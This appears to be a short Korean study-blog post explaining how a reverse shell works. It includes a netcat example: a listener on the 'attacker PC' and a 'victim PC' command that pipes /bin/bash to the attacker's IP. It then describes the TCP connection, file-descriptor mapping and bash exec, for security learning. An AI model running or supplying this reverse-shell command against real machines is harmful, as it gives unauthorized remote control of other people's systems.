---
title: 다른 pc를 마음대로 조작하는 하는 방법은 의외로 단순할지도(리버스쉘)
categories: [01_낙서장]
---


다른 호스트를 내 pc처럼 마음대로 조작하려면 어떻게 해야할까?

그냥 상대 호스트의 shell 표준입출력이 내 pc로 전달되기만 하면된다.~~\(같은말 두번하는 것 같다)~~

예를 들어 가장 대표적인 리버스쉘을 생각해보자.
nc를 이용하여 구현하면 다음과 같다.
```bash
nc -lvp <포트> #공격자 pc

nc <공격자 Ip> -e /bin/bash #희생자 pc
```

가장 간단한 형태의 리버스 쉘을 구현하였다. 

### 이렇게 리버스쉘을 구현하면 어떻게 동작하게 되는걸까?
먼저 tcp 악수 3번할 것이고, 연결을 맺을 것이다.

그러고 나면 nc명령어에 의해 소켓이 생성되고 표준입출력이 소켓에 쓰이도록 fd가 맵핑될것이다

마지막으로 희생자 pc에서는 nc가 bash로 fork, exec되어 표준입출력이 소켓으로 가도록하는 쉘로 변할 것이다.




**다른 pc를 조작하는 것은 어렵지 않다. 표준입출력만 상대방 pc로 리다이렉션시키면 끝이다**

어려운건 EDR, 방화벽 등 보안장비에 탐지가 안되는것...





앞으로 정보보안 공부를 하는데 있어서 
이해가 잘 안되는 것이 있어도 직접해보는게 중요하다고 생각한다.

위의 사례처럼 대부분의 공격방식이 원리는 간단하다.
그 공격을 실제로 적용하기 위한 기법들 때문에 코어가 되는 원리가 잘 보이지 않을 뿐이다.



**지식을 최대한 분리하고, 이해가 안되면 직접 해보고, 키워드로 기억해 놓자**










